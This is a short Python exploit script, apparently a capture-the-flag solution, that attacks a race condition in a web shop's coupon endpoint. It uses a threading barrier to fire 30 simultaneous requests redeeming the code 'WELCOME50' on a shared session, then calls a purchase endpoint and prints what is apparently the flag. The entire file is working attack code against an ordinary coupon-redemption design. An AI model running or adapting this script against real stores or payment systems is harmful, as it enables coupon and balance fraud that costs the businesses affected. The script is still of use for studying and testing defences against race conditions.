import requests
import threading

# Configuration Setup
PORT = 40568  
URL_BASE = f"http://10.21.232.223:{PORT}"
URL_REDEEM = f"{URL_BASE}/api/redeem"
URL_BUY = f"{URL_BASE}/api/buy_ramen"

THREAD_COUNT = 30
# The barrier acts as a digital starting line so all 30 threads fire at the exact same millisecond
sync_barrier = threading.Barrier(THREAD_COUNT)

# Initialize a unified session to automatically share cookies across all threads
shared_session = requests.Session()
print("[*] Initializing user session on server...")
shared_session.get(URL_BASE)

def race_strike():
    # Hold the thread here until all 30 worker threads arrive at the gate
    sync_barrier.wait()
    
    try:
        response = shared_session.post(URL_REDEEM, json={"code": "WELCOME50"}, timeout=3)
        print(f"[Result] {response.text}")
    except Exception as e:
        print(f"[-] Request failed to land: {e}")

# Create, Queue, and Deploy the Thread Array
threads = []
for i in range(THREAD_COUNT):
    t = threading.Thread(target=race_strike)
    threads.append(t)

# Fire all threads up to line up at the barrier gate
for t in threads:
    t.start()

# Wait for the simultaneous blast to clear the pipeline completely
for t in threads:
    t.join()

print("\n[*] Blasting final purchase request...")
flag_response = shared_session.post(URL_BUY)
print(f"\n[+] Server Response: {flag_response.text}")
